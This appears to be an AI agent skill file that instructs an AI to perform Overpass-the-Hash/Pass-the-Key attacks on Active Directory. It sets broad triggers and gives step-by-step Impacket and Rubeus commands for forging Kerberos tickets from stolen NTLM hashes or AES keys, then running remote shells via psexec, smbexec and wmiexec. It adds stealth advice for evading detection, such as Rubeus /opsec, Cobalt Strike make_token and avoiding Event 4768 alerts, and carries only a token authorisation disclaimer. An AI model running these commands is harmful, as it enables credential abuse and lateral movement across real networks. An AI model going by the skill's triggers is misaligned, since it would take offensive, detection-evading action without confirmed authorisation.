---
name: overpass-the-hash-ptk
description: Execute Overpass The Hash/Pass The Key (PTK) attacks in Active Directory environments where NTLM is restricted and Kerberos authentication is required. Use this skill whenever the user mentions Kerberos attacks, NTLM hashes, TGT tickets, pass-the-hash variations, Active Directory credential attacks, or needs to authenticate using stolen hashes/keys to access network resources. This is the go-to technique when traditional Pass the Hash fails due to NTLM restrictions.
---

# Overpass The Hash/Pass The Key (PTK)

## Overview

The **Overpass The Hash/Pass The Key (PTK)** attack enables authentication in Active Directory environments where traditional NTLM protocol is restricted and Kerberos takes precedence. This technique leverages NTLM hashes or AES keys to solicit Kerberos Ticket Granting Tickets (TGTs), granting access to resources the compromised user can reach.

## When to Use This Skill

- You have an NTLM hash or AES key from a compromised account
- Traditional Pass the Hash attacks fail due to NTLM restrictions
- You need to authenticate to services requiring Kerberos
- You're operating in a modern Windows environment with Kerberos enforcement
- You want to pivot using stolen credentials without the plaintext password

## Prerequisites

- NTLM hash (LM:NTLM format) or AES key of target user
- Domain name and target username
- Network access to the domain controller (KDC)
- Impacket library (Python-based attacks) or Rubeus.exe (Windows-based attacks)

## Method 1: Impacket-Based Execution

### Basic TGT Generation with NTLM Hash

```bash
# Generate TGT using NTLM hash
python getTGT.py <domain>/<username> -hashes :<NTLM_HASH>

# Export the ticket to ccache file
export KRB5CCNAME=/path/to/<username>.ccache

# Use the ticket to access target resources
python psexec.py <domain>/<username>@<target_host> -k -no-pass
```

### Alternative Execution Methods

Once you have the TGT, you can use various Impacket tools:

```bash
# SMB-based execution
python smbexec.py <domain>/<username>@<target_host> -k -no-pass

# WMI-based execution
python wmiexec.py <domain>/<username>@<target_host> -k -no-pass
```

### AES256 Key Usage

For modern environments requiring AES encryption:

```bash
# Generate TGT with AES256 key
python getTGT.py <domain>/<username> -aesKey <AES256_KEY>

# Export and use the ticket
export KRB5CCNAME=/path/to/<username>.ccache
python psexec.py <domain>/<username>@<target_host> -k -no-pass
```

## Method 2: Rubeus-Based Execution (Windows)

### Basic TGT Request with RC4-HMAC

```powershell
# Request TGT and inject into current session
.\Rubeus.exe asktgt /domain:<DOMAIN> /user:<USERNAME> /rc4:<NTLM_HASH> /ptt

# Execute remote command using the ticket
.\PsExec.exe -accepteula \\\<TARGET_HOST> cmd
```

### AES256 with Operational Security

For stealthier operations in modern environments:

```powershell
# Request TGT with AES256 and opsec flags
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HASH> /nowrap /opsec

# Inject the ticket
.\Rubeus.exe ptt /ticket:<BASE64_TICKET>
```

## Stealth Techniques

### Multi-Session Approach

> **Warning**: Each logon session can only have one active TGT at a time. Use separate sessions to avoid detection.

1. Create a new logon session using Cobalt Strike's `make_token` command
2. Generate the TGT in the new session without affecting your existing session
3. This preserves your original access while testing the compromised credentials

### Event Detection Awareness

- **Event 4768**: "A Kerberos authentication ticket (TGT) was requested" - triggered by TGT requests
- RC4-HMAC is the default encryption but modern systems prefer AES256
- Use `/opsec` flag in Rubeus to reduce detection likelihood

## Troubleshooting

### Common Errors and Solutions

| Error | Cause | Solution |
|-------|-------|----------|
| `_PyAsn1Error` | Outdated Impacket library | Update Impacket: `pip install --upgrade impacket` |
| `KDC cannot find the name` | Using IP instead of hostname | Use FQDN instead of IP address |
| `Pre-authentication failed` | Wrong hash format or encryption type | Verify hash format and try AES256 if available |
| `Ticket not found` | KRB5CCNAME not set correctly | Ensure environment variable points to valid ccache file |

### Hash Format Validation

- **NTLM Hash**: 32-character hexadecimal string (e.g., `2a3de7fe356ee524cc9f3d579f2e0aa7`)
- **LM:NTLM Format**: `LM_HASH:NTLM_HASH` (LM can be empty: `:NTLM_HASH`)
- **AES256 Key**: 64-character hexadecimal string

## Example Workflow

```bash
# Step 1: Acquire credentials (example - use appropriate method)
# NTLM hash obtained: 2a3de7fe356ee524cc9f3d579f2e0aa7

# Step 2: Generate TGT
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7

# Step 3: Export ticket
export KRB5CCNAME=/root/velociraptor.ccache

# Step 4: Access target resource
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass

# Step 5: Execute commands
whoami
net user
```

## Security Considerations

- This technique is for authorized penetration testing and security assessments only
- Always have proper authorization before executing these attacks
- Document all activities for reporting purposes
- Consider the legal and ethical implications of credential-based attacks
- Modern detection systems monitor for Kerberos anomalies - use stealth techniques appropriately

## References

- [Tarlogic - How to Attack Kerberos](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [Impacket Documentation](https://github.com/fortra/impacket)
- [Rubeus - Kerberos Attack Tool](https://github.com/GhostPack/Rubeus)
- [HackTricks - Active Directory Methodology](https://book.hacktricks.xyz/windows/active-directory-methodology/over-pass-the-hash-pass-the-key)
